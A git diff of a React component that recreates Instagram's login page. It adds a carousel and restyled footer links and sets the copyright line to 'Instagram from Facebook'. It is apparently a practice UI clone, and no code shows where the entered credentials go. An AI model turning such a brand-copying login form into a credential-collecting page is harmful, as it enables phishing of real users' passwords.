@@ -1,5 +1,7 @@
 import React, {useState} from "react";
 import axios from "axios";
+import images from "./image/image-1.jpg"
+import Carusel from "./componets/carusel";
 
 function App() {
 
@@ -23,7 +25,6 @@ function App() {
 
     setLogin('');
     setPassword('');
-
   }
 
   return (
@@ -31,6 +32,9 @@ function App() {
 
       <div id="wrapper">
         <div className="container">
+          <div className="phone">
+            <Carusel />
+          </div>
           <div className="form-data">
             <form onSubmit={submitHandler}>
               <div className="logo">
@@ -57,7 +61,7 @@ function App() {
               Don't an account? <a href="#">Sign up</a>
             </div>
             <div className="get-the-app">
-              <span>Get the app</span>
+              <span>Get the app.</span>
               <div className="badge">
                 <img
                     src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
@@ -73,19 +77,31 @@ function App() {
         <footer>
           <div className="container">
             <nav className="footer-nav">
-              <ul>
-                <li><a href="#">About Us</a></li>
-                <li><a href="#">Support</a></li>
-                <li><a href="#">Jobs</a></li>
-                <li><a href="#">Privacy</a></li>
-                <li><a href="#">Terms</a></li>
-                <li><a href="#">Profiles</a></li>
-                <li><a href="#">Languages</a></li>
+              <ul className="ul-1">
+                <li><a className="footerLink" href="#">About Us</a></li>
+                <li><a className="footerLink" href="#">Support</a></li>
+                <li><a className="footerLink" href="#">Jobs</a></li>
+                <li><a className="footerLink" href="#">Privacy</a></li>
+                <li><a className="footerLink" href="#">Terms</a></li>
+                <li><a className="footerLink" href="#">Profiles</a></li>
+                <li><a className="footerLink" href="#">Languages</a></li>
+                <li><a className="footerLink" href="#">Languages</a></li>
+                <li><a className="footerLink" href="#">Languages</a></li>
+                <li><a className="footerLink" href="#">Languages</a></li>
               </ul>
+              <ul className="ul-2">
+                <li><a className="footerLink" href="#">About Us</a></li>
+                <li><a className="footerLink" href="#">Support</a></li>
+                <li><a className="footerLink" href="#">Jobs</a></li>
+                <li><a className="footerLink" href="#">Privacy</a></li>
+                <li><a className="footerLink" href="#">Terms</a></li>
+                <li><a className="footerLink" href="#">Profiles</a></li>
+                <li><a className="footerLink" href="#">Languages</a></li>
+              </ul>
+              <div className="copyright-notice">
+                © 2021 Instagram from Facebook
+              </div>
             </nav>
-            <div className="copyright-notice">
-              &copy; 2021 Alright Reserved
-            </div>
           </div>
         </footer>
       </div>
